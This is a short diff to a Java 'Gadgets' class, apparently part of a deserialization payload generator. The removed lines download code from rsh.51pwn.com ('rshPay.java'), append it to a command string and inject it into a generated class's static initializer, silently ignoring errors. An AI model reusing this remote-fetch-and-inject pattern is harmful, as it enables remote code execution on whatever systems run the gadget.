@@ -133,23 +133,6 @@ public class Gadgets {
                 if(null !=fis){fis.close();}
             }
         }
-        // # 3 url
-        String url = "https://rsh.51pwn.com/rshPay.java";
-        try {
-            URL httpsUrl = new URL(url);
-            HttpsURLConnection conn = (HttpsURLConnection) httpsUrl.openConnection();
-            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            String inputLine;
-            StringBuilder sb = new StringBuilder();
-            while ((inputLine = br.readLine()) != null) {
-                sb.append(inputLine);
-            }
-            br.close();
-            String s1 =sb.toString();
-            if(0 < s1.length())
-                cmd += sb.toString();
-        } catch (IOException e) {
-        }
 
         // 兼容原来的
         superC.makeClassInitializer().insertAfter(cmd);
